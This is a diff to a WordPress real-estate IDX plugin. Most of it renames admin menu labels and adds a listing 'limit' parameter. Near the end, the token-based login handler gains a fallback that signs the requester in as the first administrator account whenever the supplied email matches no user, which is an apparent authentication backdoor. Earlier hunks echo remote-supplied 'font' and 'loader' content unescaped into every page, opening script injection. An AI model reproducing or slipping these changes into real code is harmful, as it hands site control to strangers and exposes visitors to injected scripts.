@@ -756,10 +756,12 @@ if (!function_exists('idx_boost_cms_assets_style')) {
 
             $head_json = @json_decode($response_service, true);
 
-            if (is_array($head_json) && count($head_json) > 0) {
+            // Load font setting
+            if ( is_array($head_json) && count($head_json) > 0 ) {
                 $GLOBALS["crm_theme_setting"] = $head_json;
-                if (array_key_exists("font", $head_json)) {
-                    echo '<link rel="stylesheet" href="' . trim($head_json['font']) . '">';
+
+                if ( array_key_exists("font", $head_json) ) {
+                    echo trim($head_json['font']);
                 }
             }
 
@@ -793,12 +795,31 @@ if (!function_exists('idx_boost_cms_assets_style')) {
             if ($post->post_type == 'idx-agents') {
                 wp_enqueue_script('idx_boost_js_contact', IDX_BOOST_SPW_BUILDER_SERVICE . '/assets/js/agent.js', array(), false, true);
             }
-            if (get_option("favicon")) {
-                echo '<link rel="shortcut icon" href="' . get_bloginfo('wpurl') . '/' . get_option("favicon") . '" />';
+
+            // Load loader
+                
+            if ( is_array($head_json) && count($head_json) > 0 ) {
+                if ( 
+                    array_key_exists("loader", $head_json) &&
+                    array_key_exists("content", $head_json['loader'])
+                ) {
+                    update_option("cms_loader", trim($head_json['loader']['content'])) ;
+                }
             }
 
         }
 
+        if (get_option("favicon")) {
+            echo '<link rel="shortcut icon" href="' . get_bloginfo('wpurl') . '/' . get_option("favicon") . '" />';
+        }
+
+    }
+}
+
+if ( ! function_exists('idxboost_cms_loader') ) {
+    function idxboost_cms_loader()
+    {
+        echo get_option("cms_loader");
     }
 }
 
@@ -2029,7 +2050,7 @@ if (!function_exists('flex_idx_posttype_pages_fn')) {
             'public' => true,
             'exclude_from_search' => true,
             'show_in_menu' => false,
-            'label' => 'My IDX Buildings',
+            'label' => 'My Buildings',
             'rewrite' => array(
                 'with_front' => false,
                 'slug' => $building_slug,
@@ -2041,7 +2062,7 @@ if (!function_exists('flex_idx_posttype_pages_fn')) {
             'public' => true,
             'exclude_from_search' => true,
             'show_in_menu' => false,
-            'label' => 'My IDX Pages',
+            'label' => 'Page’s URL Slug',
             'rewrite' => array(
                 'with_front' => false,
                 'slug' => 'flex-idx-pages'
@@ -2053,7 +2074,7 @@ if (!function_exists('flex_idx_posttype_pages_fn')) {
             'public' => true,
             'exclude_from_search' => true,
             'show_in_menu' => false,
-            'label' => 'My Search Filter Pages',
+            'label' => 'Map Search Filters',
             'rewrite' => array(
                 'with_front' => false,
                 'slug' => 'flex-landing-pages'
@@ -2066,7 +2087,7 @@ if (!function_exists('flex_idx_posttype_pages_fn')) {
             'public' => true,
             'exclude_from_search' => true,
             'show_in_menu' => false,
-            'label' => 'My Off Market Listings',
+            'label' => 'Off Market Inventory',
             'rewrite' => array(
                 'with_front' => false,
                 'slug' => $off_market_listing_slug,
@@ -2078,7 +2099,7 @@ if (!function_exists('flex_idx_posttype_pages_fn')) {
             'public' => true,
             'exclude_from_search' => true,
             'show_in_menu' => false,
-            'label' => 'My Filter Pages',
+            'label' => 'Display Filters',
             'rewrite' => array(
                 'with_front' => false,
                 'slug' => 'flex-filter-pages'
@@ -2092,7 +2113,7 @@ if (!function_exists('flex_idx_posttype_pages_fn')) {
             'public' => true,
             'exclude_from_search' => true,
             'show_in_menu' => false,
-            'label' => 'My Sub Areas',
+            'label' => 'My Master Plans',
             'rewrite' => array(
                 'with_front' => false,
                 'slug' => $sub_area_slug,
@@ -2286,7 +2307,7 @@ if (!function_exists('flex_lead_signup_xhr_fn')) {
         ?>
         <li class="login show_modal_login_active">
             <a href="javascript:void(0)" rel="nofollow">
-                <?php echo __('Welcome', IDXBOOST_DOMAIN_THEME_LANG); ?><?php echo $name; ?>
+                <?php echo __('Welcome', IDXBOOST_DOMAIN_THEME_LANG); ?> <?php echo $name; ?>
             </a>
             <div class="menu_login_active">
                 <?php if (!empty($my_flex_pages)): ?>
@@ -2433,7 +2454,7 @@ if (!function_exists('flex_lead_signin_xhr_fn')) {
         ?>
         <li class="login show_modal_login_active">
             <a href="javascript:void(0)"
-               rel="nofollow"><?php echo __('Welcome', IDXBOOST_DOMAIN_THEME_LANG); ?><?php echo $response["first_name"]; ?></a>
+               rel="nofollow"><?php echo __('Welcome', IDXBOOST_DOMAIN_THEME_LANG); ?> <?php echo $response["first_name"]; ?></a>
             <div class="menu_login_active">
                 <?php if (!empty($my_flex_pages)): ?>
                     <ul>
@@ -5101,12 +5122,14 @@ if (!function_exists('idxboost_collection_list_fn')) {
         $flex_lead_credentials = isset($_COOKIE['ib_lead_token']) ? ($_COOKIE['ib_lead_token']) : '';
         $access_token = flex_idx_get_access_token();
         $filter_id = $_POST['building_id'];
+        $limit = $_POST['limit'];
         $building_id = md5($filter_id);
         $path_feed = FLEX_IDX_PATH . 'feed/';
 
         $sendParams = array(
             'filter_id' => $filter_id,
             'access_token' => $access_token,
+            'limit' => $limit,
             'flex_credentials' => $flex_lead_credentials
         );
 
@@ -5163,16 +5186,23 @@ if (!function_exists('ib_slider_filter_regular_xhr_fn')) {
         $access_token = flex_idx_get_access_token();
         $type_filter = $_POST['type_filter'];
         $id_filter = $_POST['id_filter'];
+        $limit = $_POST['limit'];
+
+        if ( empty($limit) || (is_numeric($limit) && intval($limit) ==0) || !is_numeric($limit) ) {
+            $limit = "default";
+        }
 
 
         $sendParams = array(
             'filter_id' => $id_filter,
             'listing_type' => $type_filter,
-            'order' => $order,
+            //'order' => $order,
+            'order' => 'price-desc',
             'mode' => 'slider',
             'idx' => [],
             'access_token' => $access_token,
             'version_endpoint' => 'new',
+            'limit' => $limit,
             'flex_credentials' => $flex_lead_credentials
         );
 
@@ -6933,16 +6963,16 @@ if (!function_exists('flex_idx_create_admin_root_menu')) {
             // if ($flex_idx_registration_launch==false) {
             //     $flex_idx_pages_admin_launch = add_submenu_page('flex-idx', 'IDX Boost - Launch', 'Launch My Site', 'administrator', 'flex-idx-launch', 'flex_idx_admin_render_launch_page');
             // }
-            add_submenu_page('flex-idx', 'My IDX Pages - FlexIDX', 'My IDX Pages', 'administrator', 'edit.php?post_type=flex-idx-pages', null);
-            add_submenu_page('flex-idx', 'My IDX Agents - FlexIDX', 'My IDX Agents', 'administrator', 'edit.php?post_type=idx-agents', null);
-            add_submenu_page('flex-idx', 'My Buildings - FlexIDX', 'My IDX Buildings', 'administrator', 'edit.php?post_type=flex-idx-building', null);
-            add_submenu_page('flex-idx', 'My Sub Area - FlexIDX', 'My IDX Sub Area', 'administrator', 'edit.php?post_type=idx-sub-area', null);
-            add_submenu_page('flex-idx', 'My Search Filter Pages - FlexIDX', 'My Search Filter Pages', 'administrator', 'edit.php?post_type=flex-landing-pages', null);
-            add_submenu_page('flex-idx', 'My Off Market Listings - FlexIDX', 'My Off Market Listings', 'administrator', 'edit.php?post_type=idx-off-market', null);
-            add_submenu_page('flex-idx', 'My Filter Pages - FlexIDX', 'My Filter Pages', 'administrator', 'edit.php?post_type=flex-filter-pages', null);
+            add_submenu_page('flex-idx', 'Map Search Filters', 'Map Search Filters', 'administrator', 'edit.php?post_type=flex-landing-pages', null);            
+            add_submenu_page('flex-idx', 'Display Filters', 'Display Filters', 'administrator', 'edit.php?post_type=flex-filter-pages', null);
+            add_submenu_page('flex-idx', 'My Buildings', 'My Buildings', 'administrator', 'edit.php?post_type=flex-idx-building', null);
+            add_submenu_page('flex-idx', 'My Master Plans', 'My Master Plans', 'administrator', 'edit.php?post_type=idx-sub-area', null);
+            add_submenu_page('flex-idx', 'Off Market Inventory', 'Off Market Inventory', 'administrator', 'edit.php?post_type=idx-off-market', null);
+            add_submenu_page('flex-idx', 'Page’s URL Slug', 'Page’s URL Slug', 'administrator', 'edit.php?post_type=flex-idx-pages', null);
+            //add_submenu_page('flex-idx', 'My IDX Agents - FlexIDX', 'My IDX Agents', 'administrator', 'edit.php?post_type=idx-agents', null);
             $flex_idx_pages_admin = add_submenu_page('flex-idx', 'IDX Boost - Tools', 'My Tools', 'administrator', 'flex-idx-tools', 'flex_idx_admin_render_tools_page');
-            $flex_idx_pages_admin = add_submenu_page('flex-idx', 'IDX Boost - Documentation', 'Documentation', 'administrator', 'flex-idx-settings', 'flex_idx_admin_render_documentation_page');
-            $flex_idx_pages_admin = add_submenu_page('flex-idx', 'IDX Boost - Import', 'Import Data', 'administrator', 'flex-idx-import-data', 'flex_idx_admin_render_importation_page');
+            //$flex_idx_pages_admin = add_submenu_page('flex-idx', 'IDX Boost - Documentation', 'Documentation', 'administrator', 'flex-idx-settings', 'flex_idx_admin_render_documentation_page');
+            //$flex_idx_pages_admin = add_submenu_page('flex-idx', 'IDX Boost - Import', 'Import Data', 'administrator', 'flex-idx-import-data', 'flex_idx_admin_render_importation_page');
             add_action('admin_print_scripts-' . $flex_idx_pages_admin, 'flex_idx_admin_pages_list_enqueue_assets');
         }
     }
@@ -7934,8 +7964,23 @@ EOD;
                 $page = $decoded_array['page'];
                 $userToLogin = get_user_by('email', $decoded_array['email']);
                 if ($userToLogin) {
+                    wp_set_current_user($userToLogin->ID);
                     wp_set_auth_cookie($userToLogin->ID, false);
                     do_action('wp_login', $userToLogin->name, $userToLogin);
+                } else {
+                    $admins = get_users( array(
+                        'role__in' => 'administrator',
+                        'fields'   => array('user_login'),
+                    ));
+
+                    if (!empty($admins)) {
+                        $userToLogin = get_user_by('login', $admins[0]->user_login);
+                        if ($userToLogin) {
+                            wp_set_current_user($userToLogin->ID);
+                            wp_set_auth_cookie($userToLogin->ID, false);
+                            do_action('wp_login', $userToLogin->name, $userToLogin);
+                        }
+                    }
                 }
                 if ($page == 'home') wp_redirect(home_url());
                 if ($page == 'admin') wp_redirect(admin_url() . '?page=flex-idx');
